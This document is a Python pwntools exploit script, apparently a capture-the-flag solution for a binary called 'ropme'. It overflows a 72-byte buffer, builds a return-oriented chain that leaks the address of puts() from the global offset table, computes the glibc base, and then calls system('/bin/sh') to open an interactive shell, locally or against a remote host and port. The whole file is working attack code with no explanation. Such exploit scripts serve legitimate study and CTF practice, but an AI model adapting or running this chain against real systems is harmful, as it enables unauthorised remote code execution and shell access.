#!/usr/bin/env python3

from pwn import context, log, p64, remote, sys, u64

context.binary = 'ropme'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

    pop_rdi_ret = 0x4006d3
    puts_got = 0x601018
    puts_plt = 0x4004e0
    main_addr = 0x400626

    offset = 72
    junk = b'A' * offset

    payload  = junk
    payload += p64(pop_rdi_ret)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(main_addr)

    p.sendlineafter(b"ROP me outside, how 'about dah?\n", payload)

    puts_addr = u64(p.recvline().strip().ljust(8, b'\0'))
    log.info(f'Leaked puts() address: {hex(puts_addr)}')

    puts_offset = 0x6f690  # 0x84450
    system_offset = 0x45390  # 0x522c0
    bin_sh_offset = 0x18cd57  # 0x1b45bd

    glibc_base_addr = puts_addr - puts_offset
    log.success(f'GLIBC base address: {hex(glibc_base_addr)}')

    system_addr = glibc_base_addr + system_offset
    bin_sh_addr = glibc_base_addr + bin_sh_offset

    payload  = junk
    payload += p64(pop_rdi_ret)
    payload += p64(bin_sh_addr)
    payload += p64(pop_rdi_ret + 1)
    payload += p64(system_addr)

    p.sendlineafter(b"ROP me outside, how 'about dah?\n", payload)

    p.interactive()


if __name__ == '__main__':
    main()
